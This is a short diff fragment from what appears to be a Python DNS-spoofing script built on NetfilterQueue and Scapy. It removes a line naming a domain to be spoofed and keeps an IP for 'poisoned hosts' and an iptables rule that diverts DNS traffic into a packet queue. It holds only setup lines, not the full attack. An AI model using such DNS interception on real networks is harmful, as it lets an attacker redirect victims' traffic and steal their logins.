@@ -4,7 +4,6 @@ from netfilterqueue import NetfilterQueue
 from scapy.layers.dns import DNSQR, DNS, DNSRR
 from scapy.layers.inet import IP, UDP
 
-domain = 'm.naver.com'  # domain to be spoofed
 localIP = '192.168.1.74'  # IP address for poisoned hosts.
 
 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
